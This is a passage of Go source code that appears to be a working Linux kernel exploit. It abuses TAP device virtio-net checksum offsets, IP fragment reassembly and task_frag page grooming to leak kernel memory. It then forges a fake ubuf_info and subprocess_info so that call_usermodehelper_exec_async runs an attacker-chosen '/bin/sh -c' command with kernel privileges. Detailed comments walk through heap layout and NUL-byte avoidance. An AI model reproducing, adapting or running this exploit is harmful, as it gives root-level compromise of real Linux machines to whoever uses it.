	head = stalePaddedGSOFrame(logicalHead, c.staleFragPadLen, 0x71)
	bridge = frameWithoutVLAN(ipv4PacketWithOptionsFor(8, false, bytesRepeat(512, 0x62), id, nil,
		src, dst, ipProtoRaw))
	return head, bridge
}

func staleNaturalLocalCoalesceFrames(c cfg, id uint16) (middle, head, bridge, tail []byte) {
	// The small bridge precedes the jumbo in fragment order. Both its head and
	// the reassembly head are built from current->task_frag, so
	// skb_try_coalesce can steal the bridge head into the destination shinfo
	// before the kmalloc-backed jumbo head rejects coalescing.
	l2 := l2LenForTags(c.vlanTags)
	middlePayloadLen := c.staleFragPadLen - l2 - ipLen
	middlePayload := bytesRepeat(middlePayloadLen, 0x72)
	src := net.ParseIP("10.0.0.2").To4()
	dst := net.ParseIP("10.0.0.1").To4()
	middle = frameWithVLAN(ipv4PacketWithOptionsFor(32, true, middlePayload, id, nil,
		src, dst, ipProtoRaw), c.vlanTags)
	head = frameWithoutVLAN(ipv4PacketWithOptionsFor(0, true, bytesRepeat(8, 0x68), id, nil,
		src, dst, ipProtoRaw))
	bridge = frameWithoutVLAN(ipv4PacketWithOptionsFor(8, true, bytesRepeat(24, 0x62), id, nil,
		src, dst, ipProtoRaw))
	tail = frameWithoutVLAN(ipv4PacketWithOptionsFor(32+middlePayloadLen, false, bytesRepeat(8, 0x7a), id, nil,
		src, dst, ipProtoRaw))
	return middle, head, bridge, tail
}

func ipv4PayloadWindow(pkts [][]byte, offset, length int) ([]byte, bool) {
	out := make([]byte, length)
	seen := make([]bool, length)
	for _, ip := range pkts {
		if len(ip) < ipLen {
			continue
		}
		ihl := int(ip[0]&0x0f) * 4
		end := min(len(ip), int(binary.BigEndian.Uint16(ip[2:])))
		if ihl < ipLen || ihl > end {
			continue
		}
		fragOffset := int(binary.BigEndian.Uint16(ip[6:])&0x1fff) * 8
		payload := ip[ihl:end]
		from := max(offset, fragOffset)
		to := min(offset+length, fragOffset+len(payload))
		if from >= to {
			continue
		}
		copy(out[from-offset:to-offset], payload[from-fragOffset:to-fragOffset])
		for i := from - offset; i < to-offset; i++ {
			seen[i] = true
		}
	}
	for _, ok := range seen {
		if !ok {
			return out, false
		}
	}
	return out, true
}

func stalePageGroomFrame(fill byte, victimHead, fragPage, _, _, callback uint64, copyLen int, execAsync, noopRet uint64, command string) ([]byte, error) {
	// 3456 is the largest convenient frame that still passes tun_can_build_skb's
	// PAGE_SIZE eligibility check, which includes TUN_RX_PAD, XDP headroom, and
	// skb_shared_info. With no XDP program the actual task_frag chunk is 3840
	// bytes, so eight chunks fit in a 32768-byte high-order page and the ninth
	// starts at offset zero in a fresh page.
	frame := bytesRepeat(3456, fill)
	copy(frame[0:6], []byte{0x02, 0x00, 0x00, 0x00, 0x00, 0x01})
	copy(frame[6:12], []byte{0x02, 0x00, 0x00, 0x00, 0x00, 0x02})
	binary.BigEndian.PutUint16(frame[12:14], ethPExperiment)
	if fragPage != 0 {
		// The predecessor starts at victim head+64.  A reclaimed short
		// child's skb_shared_info begins at head+128 and frags[0] begins
		// another 48 bytes later, so frame+112 seeds the 16-byte skb_frag_t.
		// Keep destructor_arg (frame+104) zero: a stale write may set the
		// zerocopy-enable flag, but skb_zcopy() then returns NULL and release
		// continues to the nr_frags loop without making a callback.
		for i := 104; i < 112; i++ {
			frame[i] = 0
		}
		binary.LittleEndian.PutUint64(frame[112:120], fragPage)
		binary.LittleEndian.PutUint32(frame[120:124], 1) // skb_frag_t.len
		binary.LittleEndian.PutUint32(frame[124:128], 0) // skb_frag_t.offset
	}
	if victimHead != 0 {
		// The reclaimed short child has end=128. skb_shared_info starts
		// there, destructor_arg is at +40, and frags[] starts at +48.
		// Predecessor bytes start at head+64, so frame offsets 104, 120,
		// and 144 seed destructor_arg, a fake ubuf_info, and fake ops.
		const fakeUarg = 184
		fakeOps := uint64(208)
		if execAsync != 0 {
			if callback == 0 || noopRet == 0 {
				return nil, errors.New("fake subprocess_info requires callback and noop-ret addresses")
			}
			// fakeUarg is also the strcpy source. Put fake ops at source+80:
			// this avoids NUL bytes in its page-relative address and makes the
			// callback pointer overlap the unused cleanup field of the fake
			// subprocess_info. The overwritten skb destructor at source+96
			// invokes call_usermodehelper_exec_async(skb). Copy through skb->len
			// at offset 112 so ____dev_forward_skb rejects and frees the skb
			// immediately, before the receive path reuses skb->cb (which holds
			// subprocess_info.path/argv/envp in the copied prefix).
			fakeOps = fakeUarg + 80
			copyLen = 116
		}
		if copyLen != 0 && execAsync == 0 {
			// Offset 0x111 avoids NUL bytes in the little-endian pointer
			// when victimHead is page aligned. This lets strcpy copy a
			// selected non-NUL span from fakeUarg.
			fakeOps = 0x111
		}
		binary.LittleEndian.PutUint64(frame[104:112], victimHead+fakeUarg)
		binary.LittleEndian.PutUint64(frame[120:128], victimHead+fakeOps)
		if copyLen != 0 {
			for i := 8; i < copyLen; i++ {
				frame[120+i] = fill
			}
			frame[120+copyLen] = 0
		} else {
			binary.LittleEndian.PutUint32(frame[128:132], 1)
			frame[132] = 0
		}
		opsAt := int(fakeOps) - 64
		binary.LittleEndian.PutUint64(frame[opsAt:opsAt+8], callback)
		binary.LittleEndian.PutUint64(frame[opsAt+8:opsAt+16], 0)
		if execAsync != 0 {
			const (
				pathOff     = 0x511
				dashCOff    = 0x531
				cmdOff      = 0x551
				argvOff     = 0x711
				envpOff     = 0x791
				completeOff = 0x820
				fakeDevOff  = 0x911
				fakeCTOff   = 0xb10
			)
			uargAt := fakeUarg - 64
			put64 := func(sourceOff int, value uint64) {
				binary.LittleEndian.PutUint64(frame[uargAt+sourceOff:uargAt+sourceOff+8], value)
			}
			putHead := func(headOff int, value []byte) {
				copy(frame[headOff-64:], value)
			}
			put64(0, victimHead+fakeOps)
			put64(8, victimHead+0x311)
			// strcpy replaces skb->dev at destination offset 16. A real,
			// aligned net_device pointer contains NUL bytes and cannot appear
			// inside the source string, so point it at controlled page data.
			// dev_net() only reads nd_net for a pointer comparison, and
			// eth_type_trans() replaces skb->dev with the real receiving device
			// immediately afterwards. The all-fill fake object intentionally
			// makes the comparison request the cross-netns scrub path.
			put64(16, victimHead+fakeDevOff)
			put64(24, victimHead+0x331)
			put64(32, victimHead+completeOff)
			put64(40, victimHead+pathOff)
			put64(48, victimHead+argvOff)
			put64(56, victimHead+envpOff)
			binary.LittleEndian.PutUint32(frame[uargAt+64:uargAt+68], 0x02020202)
			put64(72, noopRet)
			put64(80, callback)
			put64(88, victimHead+cmdOff)
			put64(96, execAsync)
			// skb_release_head_state runs nf_reset_ct after the destructor.
			// The prefix must therefore carry a non-NUL, safely refcounted
			// _nfct value. Low three bits are flags and are masked before the
			// controlled nf_conntrack.use field is decremented.
			put64(104, victimHead+fakeCTOff+1)
			binary.LittleEndian.PutUint32(frame[uargAt+112:uargAt+116], 0x7f7f7f7f)
			frame[uargAt+copyLen] = 0
			if nulAt := bytes.IndexByte(frame[uargAt:uargAt+copyLen], 0); nulAt >= 0 {
				return nil, fmt.Errorf("fake subprocess_info contains a NUL at byte %d before terminator %d for head %#x", nulAt, copyLen, victimHead)
			}

			putHead(pathOff, append([]byte("/bin/sh"), 0))
			putHead(dashCOff, []byte{'-', 'c', 0})
			putHead(cmdOff, append([]byte(command), 0))
			argvAt := argvOff - 64
			binary.LittleEndian.PutUint64(frame[argvAt:argvAt+8], victimHead+pathOff)
			binary.LittleEndian.PutUint64(frame[argvAt+8:argvAt+16], victimHead+dashCOff)
			binary.LittleEndian.PutUint64(frame[argvAt+16:argvAt+24], victimHead+cmdOff)
			binary.LittleEndian.PutUint64(frame[argvAt+24:argvAt+32], 0)
			binary.LittleEndian.PutUint64(frame[envpOff-64:envpOff-56], 0)
			completeAt := completeOff - 64
			// struct completion: done=0, unlocked swait head, empty list.
			for i := 0; i < 16; i++ {
				frame[completeAt+i] = 0
			}
			binary.LittleEndian.PutUint64(frame[completeAt+16:completeAt+24], victimHead+completeOff+16)
			binary.LittleEndian.PutUint64(frame[completeAt+24:completeAt+32], victimHead+completeOff+16)
			binary.LittleEndian.PutUint32(frame[fakeCTOff-64:fakeCTOff-60], 0x02020202)
		}
	}
	return frame, nil
}

func staleFragSeedFrame(length int, fill byte) []byte {
	frame := bytesRepeat(length, fill)
	copy(frame[0:6], []byte{0x02, 0x00, 0x00, 0x00, 0x00, 0x01})
	copy(frame[6:12], []byte{0x02, 0x00, 0x00, 0x00, 0x00, 0x02})
	binary.BigEndian.PutUint16(frame[12:14], ethPExperiment)
	return frame
}

func stalePaddedGSOFrame(frame []byte, length int, fill byte) []byte {
	padded := bytesRepeat(length, fill)
	copy(padded, frame)
	return padded
}

func solvePacketChecksumAt(pkt []byte, adjust int, desired uint16) bool {
	if adjust < 0 || adjust+1 >= len(pkt) {
		return false
	}
	for w := 0; w < 65536; w++ {
		pkt[adjust] = byte(w)
		pkt[adjust+1] = byte(w >> 8)
		if csumFold(csumPartial(pkt)) == desired {
			return true
		}
	}
	return false
}

func ipv4PacketWithOptions(offset int, more bool, payload []byte, id uint16, options []byte) []byte {
	return ipv4PacketWithOptionsFor(offset, more, payload, id, options,
		net.ParseIP("10.0.0.2").To4(), net.ParseIP("10.99.0.2").To4(), ipProtoRaw)
}

func ipv4PacketWithOptionsFor(offset int, more bool, payload []byte, id uint16, options []byte, src, dst net.IP, proto byte) []byte {
	hlen := ipLen + len(options)
	pkt := make([]byte, hlen+len(payload))
	pkt[0] = 0x40 | byte(hlen/4)
	binary.BigEndian.PutUint16(pkt[2:], uint16(len(pkt)))
	binary.BigEndian.PutUint16(pkt[4:], id)
	off := uint16(offset / 8)
	if more {
		off |= 0x2000
	}
	binary.BigEndian.PutUint16(pkt[6:], off)
	pkt[8] = 64
	pkt[9] = proto
	copy(pkt[12:16], src.To4())
	copy(pkt[16:20], dst.To4())
	copy(pkt[ipLen:hlen], options)
	copy(pkt[hlen:], payload)
	binary.BigEndian.PutUint16(pkt[10:], ipChecksum(pkt[:hlen]))
	return pkt
}

func verifyWrite(tap *os.File, cap *capture, c cfg) error {
	payload := bytesRepeat(300, 0x5a)
	if !testo(payload, 0x1111, c.csumOffset, uint16(c.csumWord)) {
		return fmt.Errorf("solver found no adjustment for checksum word 0x%04x", c.csumWord)
	}
	pkt := datagram(0x1111, payload)
	if err := writeTap(tap, frameWithVLAN(pkt, c.vlanTags), true, uint16(l2LenForTags(c.vlanTags)), uint16(c.csumOffset)); err != nil {
		return err
	}
	got := cap.collect(500*time.Millisecond, observedID(c, 0x1111))
	if len(got) == 0 {
		return errors.New("verify: no fragment captured")
	}
	written := binary.LittleEndian.Uint16(got[0][c.csumOffset : c.csumOffset+2])
	preserve := fragmentPreserveMask(c.csumOffset)
	fmt.Printf("verify: csum_offset=%d wanted=0x%04x observed=0x%04x first=0x%02x ihl=%d hdr=%s\n",
		c.csumOffset, c.csumWord, written, got[0][0], got[0][0]&0x0f,
		hex.EncodeToString(got[0][:min(20, len(got[0]))]))
	if (written & preserve) != (uint16(c.csumWord) & preserve) {
		return fmt.Errorf("verify: wanted word 0x%04x at IP offset %d, got 0x%04x", c.csumWord, c.csumOffset, written)
	}
	if preserve != 0xffff {
		fmt.Printf("verify: fragment construction rewrites mask 0x%04x after checksum completion; preserved mask 0x%04x matched\n", ^preserve, preserve)
	}
	return nil
}

func bali(tap *os.File, cap *capture, c cfg, verbose bool) ([][]byte, error) {
	payload := make([]byte, c.head+c.rest)
	for i := range payload {
		payload[i] = 0x11
	}
	proto := byte(ipProtoRaw)
	switch c.transport {
	case "udp":
		proto = ipProtoUDP
		egressUDPHeaders(payload, uint16(c.udpSrcPort), uint16(c.udpPort))
	case "tcp":
		proto = ipProtoTCP
		egressTCPHeaders(payload, uint16(c.tcpSrcPort), uint16(c.tcpPort))
	default:
		for i := 0; i < c.head; i++ {
			payload[i] = marker
		}
	}
	src := net.ParseIP("10.0.0.2").To4()
	dst := net.ParseIP("10.99.0.2").To4()
	if !egressSolveAt(payload, ipID, src, dst, proto, c.csumOffset, uint16(c.csumWord), egressAdjustmentIPOffset(c.transport)) {
		return nil, fmt.Errorf("solver found no adjustment for checksum word 0x%04x", c.csumWord)
	}
	if verbose {
		printHead(c)
	}
	second := frameWithVLAN(egressFragment(c.head, false, payload[c.head:], ipID, src, dst, proto), c.vlanTags)
	if err := writeTap(tap, second, true, uint16(l2LenForTags(c.vlanTags)+ipLen), 0); err != nil {
		return nil, err
	}
	tebar := egressSprayFrame(
		net.HardwareAddr{0x02, 0x00, 0x00, 0x00, 0x00, 0x02},
		net.HardwareAddr{0x02, 0x00, 0x00, 0x00, 0x00, 0x01},
		c.tebarFill,
	)
	for i := 0; i < c.tebar; i++ {
		if err := writeTap(tap, tebar, false, 0, 0); err != nil {
			return nil, err
		}
	}
	if c.tebar > 0 && c.sprayDelay > 0 {
		time.Sleep(c.sprayDelay)
	}
	first := frameWithVLAN(egressFragment(0, true, payload[:c.head], ipID, src, dst, proto), c.vlanTags)
	if err := writeTap(tap, first, true, uint16(l2LenForTags(c.vlanTags)), uint16(c.csumOffset)); err != nil {
		return nil, err
	}
	pkts := cap.collect(c.capture, observedID(c, ipID))
	if len(pkts) == 0 {
		return nil, errors.New("no fragment captured")
	}
	var leaks [][]byte
	var balied, mutated bool
	for i, ip := range pkts {
		ihl := int(ip[0]&0x0f) * 4
		if verbose {
			fmt.Printf("frag %d first=0x%02x ihl_bytes=%d tot=%d\n",
				i, ip[0], ihl, binary.BigEndian.Uint16(ip[2:]))
		}
		if len(ip) < c.csumOffset+2 {
			continue
		}
		written := binary.LittleEndian.Uint16(ip[c.csumOffset : c.csumOffset+2])
		preserve := fragmentPreserveMask(c.csumOffset)
		if (written & preserve) != (uint16(c.csumWord) & preserve) {
			continue
		}
		mutated = true
		if c.csumOffset != 0 || c.csumWord != 0x004f {
			if verbose {
				fmt.Printf("  deferred-word offset=%d wanted=0x%04x observed=0x%04x\n", c.csumOffset, c.csumWord, written)
			}
			continue
		}
		extra := ip[ipLen:ihl]
		if verbose {
			fmt.Printf("  options %d bytes: %s\n", len(extra), hex.EncodeToString(extra))
			if ip[9] == ipProtoUDP && binary.BigEndian.Uint16(ip[6:])&0x1fff == 0 && len(ip) >= ihl+8 {
				udp := ip[ihl : ihl+8]
				fmt.Printf("  post-mutation udp src=%d dst=%d len=%d checksum=0x%04x\n",
					binary.BigEndian.Uint16(udp[0:2]), binary.BigEndian.Uint16(udp[2:4]),
					binary.BigEndian.Uint16(udp[4:6]), binary.BigEndian.Uint16(udp[6:8]))
			} else if ip[9] == ipProtoTCP && binary.BigEndian.Uint16(ip[6:])&0x1fff == 0 && len(ip) >= ihl+20 {
				tcp := ip[ihl : ihl+20]
				fmt.Printf("  post-mutation tcp src=%d dst=%d data_offset=%d flags=0x%02x checksum=0x%04x\n",
					binary.BigEndian.Uint16(tcp[0:2]), binary.BigEndian.Uint16(tcp[2:4]),
					tcp[12]>>4, tcp[13], binary.BigEndian.Uint16(tcp[16:18]))
			}
		}
		host := extra[c.head:]
		leaks = append(leaks, append([]byte(nil), host...))
		nonzero := 0
		for _, b := range host {
			if b != 0 {
				nonzero++
			}
		}
		if len(host) > 0 {
			balied = true
		}
		if verbose {
			fmt.Printf("  past-linear hex=%s ascii=%q nonzero=%d/%d\n",
				hex.EncodeToString(host), string(host), nonzero, len(host))
			printKernelPointerCandidates("  ", host)
		}
	}
	if verbose {
		switch {
		case balied:
			fmt.Println("123")
		case mutated:
			fmt.Println("456")
		default:
			fmt.Println("678")
		}
	}
	return leaks, nil
}

func testo(payload []byte, id uint16, csumOffset int, desired uint16) bool {
	const adj = 32
	if adj+1 >= ipLen+len(payload) {
		return false
	}
	off := adj - ipLen
	for w := 0; w < 65536; w++ {
		payload[off] = byte(w)
		payload[off+1] = byte(w >> 8)
		pkt := datagram(id, payload)
		forwardTTL(pkt)
		if csumFold(csumPartial(pkt)) == desired {
			return true
		}
	}
	return false
}

func fragmentPreserveMask(offset int) uint16 {
	mask := uint16(0xffff)
	for byteIndex := 0; byteIndex < 2; byteIndex++ {
		absolute := offset + byteIndex
		if (absolute >= 2 && absolute < 4) ||
			(absolute >= 6 && absolute < 8) ||
			(absolute >= 10 && absolute < 12) {
			mask &^= 0xff << (8 * byteIndex)
		}
	}
	return mask
}

func observedID(c cfg, original uint16) uint16 {
	var id [2]byte
	binary.BigEndian.PutUint16(id[:], original)
	var written [2]byte
	binary.LittleEndian.PutUint16(written[:], uint16(c.csumWord))
	for i := 0; i < 2; i++ {
		absolute := c.csumOffset + i
		if absolute >= 4 && absolute < 6 {
			id[absolute-4] = written[i]
		}
	}
	return binary.BigEndian.Uint16(id[:])
}

func datagram(id uint16, payload []byte) []byte {
	return fragment(0, false, payload, id)
}

func fragment(offset int, more bool, payload []byte, idOpt ...uint16) []byte {
	id := uint16(ipID)
	if len(idOpt) > 0 {
		id = idOpt[0]
	}
	pkt := make([]byte, ipLen+len(payload))
	pkt[0] = 0x45
	binary.BigEndian.PutUint16(pkt[2:], uint16(len(pkt)))
	binary.BigEndian.PutUint16(pkt[4:], id)
	off := uint16(offset / 8)
	if more {
		off |= 0x2000
	}
	binary.BigEndian.PutUint16(pkt[6:], off)
	pkt[8] = 64
	pkt[9] = 253
	copy(pkt[12:16], net.ParseIP("10.0.0.2").To4())
	copy(pkt[16:20], net.ParseIP("10.99.0.2").To4())
	copy(pkt[ipLen:], payload)
	binary.BigEndian.PutUint16(pkt[10:], ipChecksum(pkt[:ipLen]))
	return pkt
}

func forwardTTL(pkt []byte) {
	raw := uint32(pkt[10]) | uint32(pkt[11])<<8
	raw += 0x0001
	if raw >= 0xFFFF {
		raw++
	}
	pkt[8]--
	pkt[10] = byte(raw)
	pkt[11] = byte(raw >> 8)
}
func frame(ip []byte) []byte {
	return frameWithVLAN(ip, 2)
}

func frameWithVLAN(ip []byte, tags int) []byte {
	l2 := l2LenForTags(tags)
	f := make([]byte, l2+len(ip))
	copy(f[0:6], []byte{0x02, 0x00, 0x00, 0x00, 0x00, 0x01})
	copy(f[6:12], []byte{0x02, 0x00, 0x00, 0x00, 0x00, 0x02})
	binary.BigEndian.PutUint16(f[12:], vlanProto)
	off := ethLen
	for i := 0; i < tags; i++ {
		binary.BigEndian.PutUint16(f[off:], 0)
		proto := uint16(vlanProto)
		if i == tags-1 {
			proto = ipProtoEth
		}
		binary.BigEndian.PutUint16(f[off+2:], proto)
		off += vlanLen
	}
	copy(f[l2:], ip)
	return f
}

func frameWithoutVLAN(ip []byte) []byte {
	f := make([]byte, ethLen+len(ip))
	copy(f[0:6], []byte{0x02, 0x00, 0x00, 0x00, 0x00, 0x01})
	copy(f[6:12], []byte{0x02, 0x00, 0x00, 0x00, 0x00, 0x02})
	binary.BigEndian.PutUint16(f[12:], ipProtoEth)
	copy(f[ethLen:], ip)
	return f
}

func l2LenForTags(tags int) int { return ethLen + tags*vlanLen }

func writeTap(tap *os.File, frame []byte, csum bool, start, offset uint16) error {
	buf := make([]byte, 10+len(frame))
	if csum {
		buf[0] = needsCsum
		binary.LittleEndian.PutUint16(buf[6:], start)
		binary.LittleEndian.PutUint16(buf[8:], offset)
	}
	copy(buf[10:], frame)
	for {
		_, err := tap.Write(buf)
		if err == nil || !errors.Is(err, syscall.EAGAIN) {
			return err
		}
		time.Sleep(time.Millisecond)
	}
}

func writeTapGSO(tap *os.File, frame []byte, gsoType byte, hdrLen, gsoSize uint16, checksum bool, csumStart, csumOffset uint16) error {
	buf := make([]byte, 10+len(frame))
	if checksum {
		buf[0] = needsCsum
		binary.LittleEndian.PutUint16(buf[6:], csumStart)
		binary.LittleEndian.PutUint16(buf[8:], csumOffset)
	}
	buf[1] = gsoType
	binary.LittleEndian.PutUint16(buf[2:], hdrLen)
	binary.LittleEndian.PutUint16(buf[4:], gsoSize)
	copy(buf[10:], frame)
	for {
		_, err := tap.Write(buf)
		if err == nil || !errors.Is(err, syscall.EAGAIN) {
			return err
		}
		time.Sleep(time.Millisecond)
	}
}

type capture struct{ fd int }

func (c *capture) drainCount(count int, timeout time.Duration) error {
	deadline := time.Now().Add(timeout)
	buf := make([]byte, 65536)
	for received := 0; received < count; {
		if time.Now().After(deadline) {
			return fmt.Errorf("received %d/%d frames before timeout", received, count)
		}
		_, _, err := syscall.Recvfrom(c.fd, buf, 0)
		if err != nil {
			if errors.Is(err, syscall.EAGAIN) || errors.Is(err, syscall.EWOULDBLOCK) || errors.Is(err, syscall.EINTR) {
				continue
			}
			return err
		}
		received++
	}
	return nil
}

func listen(ifname string) (*capture, error) {
	fd, err := syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, int(htons(syscall.ETH_P_ALL)))
	if err != nil {
		return nil, err
	}
	ifi, err := net.InterfaceByName(ifname)
	if err != nil {
		syscall.Close(fd)
		return nil, err
	}
	if err := syscall.Bind(fd, &syscall.SockaddrLinklayer{Protocol: htons(syscall.ETH_P_ALL), Ifindex: ifi.Index}); err != nil {
		syscall.Close(fd)
		return nil, err
	}
	syscall.SetsockoptTimeval(fd, syscall.SOL_SOCKET, syscall.SO_RCVTIMEO, &syscall.Timeval{Usec: 5000})
	return &capture{fd: fd}, nil
}

func (c *capture) Close() { syscall.Close(c.fd) }

func (c *capture) drain(d time.Duration) {
	deadline := time.Now().Add(d)
	buf := make([]byte, 65536)
	for time.Now().Before(deadline) {
		_, _, err := syscall.Recvfrom(c.fd, buf, 0)
		if err != nil && !errors.Is(err, syscall.EAGAIN) && !errors.Is(err, syscall.EWOULDBLOCK) {
			return
		}
	}
}

func (c *capture) collect(d time.Duration, id uint16) [][]byte {
	deadline := time.Now().Add(d)
	var out [][]byte
	buf := make([]byte, 65536)
	for time.Now().Before(deadline) {
		n, _, err := syscall.Recvfrom(c.fd, buf, 0)
		if err != nil {
			if errors.Is(err, syscall.EAGAIN) || errors.Is(err, syscall.EWOULDBLOCK) {
				continue
			}
			break
		}
		ip := ipv4Of(buf[:n])
		if ip == nil || binary.BigEndian.Uint16(ip[4:]) != id {
			continue
		}
		out = append(out, append([]byte(nil), ip...))
	}
	return out
}

func ipv4Of(frame []byte) []byte {
	proto, payload := ethernetPayload(frame)
	if proto != ipProtoEth || len(payload) < ipLen {
		return nil
	}
	return payload
}

func ethernetPayload(frame []byte) (uint16, []byte) {
	if len(frame) < ethLen {
		return 0, nil
	}
	off := ethLen
	proto := binary.BigEndian.Uint16(frame[12:14])
	for proto == vlanProto {
		if len(frame) < off+vlanLen {
			return 0, nil
		}
		proto = binary.BigEndian.Uint16(frame[off+2 : off+4])
		off += vlanLen
	}
	return proto, frame[off:]
}

func openTap(name string, page bool) (*os.File, error) {
	flags := os.O_RDWR
	if page {
		flags |= syscall.O_NONBLOCK
	}
	f, err := os.OpenFile("/dev/net/tun", flags, 0)
	if err != nil {
		return nil, err
	}
	var req [64]byte
	copy(req[:], name)
	*(*uint16)(unsafe.Pointer(&req[16])) = iffTap | iffNoPI | iffVnetHdr
	if _, _, errno := syscall.Syscall(syscall.SYS_IOCTL, f.Fd(), tunSetIFF, uintptr(unsafe.Pointer(&req[0]))); errno != 0 {
		f.Close()
		return nil, fmt.Errorf("TUNSETIFF: %w", errno)
	}
	if page {
		snd := int32(0x7fffffff)
		if _, _, errno := syscall.Syscall(syscall.SYS_IOCTL, f.Fd(), tunSetSndBuf, uintptr(unsafe.Pointer(&snd))); errno != 0 {
			f.Close()
			return nil, fmt.Errorf("TUNSETSNDBUF: %w", errno)
		}
	}
	return f, nil
}

func printHead(c cfg) {
	frameLen := l2LenForTags(c.vlanTags) + ipLen + c.head
	past := 60 - (ipLen + c.head)
	via := "slab skb (tun_alloc_skb)"
	if c.page {
		via = "page_frag skb (tun_build_skb)"
	}
	fmt.Printf("head: payload=%d frame=%d vlan_tags=%d linear_after_strip=%d copy=60 past_headlen=%d via=%s tebar=%d fill=0x%02x\n",
		c.head, frameLen, c.vlanTags, ipLen+c.head, past, via, c.tebar, c.tebarFill)
}

func ipChecksum(h []byte) uint16 {
	var sum uint32
	for i := 0; i+1 < len(h); i += 2 {
		sum += uint32(binary.BigEndian.Uint16(h[i:]))
	}
	for sum > 0xffff {
		sum = (sum & 0xffff) + (sum >> 16)
	}
	return ^uint16(sum)
}

func csumPartial(b []byte) uint32 {
	var sum uint32
	i := 0
	for ; i+1 < len(b); i += 2 {
		sum += uint32(b[i]) | uint32(b[i+1])<<8
	}
	if i < len(b) {
		sum += uint32(b[i])
	}
	return sum
}

func csumFold(sum uint32) uint16 {
	sum = (sum & 0xffff) + (sum >> 16)
	sum = (sum & 0xffff) + (sum >> 16)
	return ^uint16(sum)
}

func bytesRepeat(n int, b byte) []byte {
	p := make([]byte, n)
	for i := range p {
		p[i] = b
	}
	return p
}

func getenv(key, fallback string) string {
	if v := os.Getenv(key); v != "" {
		return v
	}
	return fallback
}

func htons(v uint16) uint16 { return v<<8 | v>>8 }
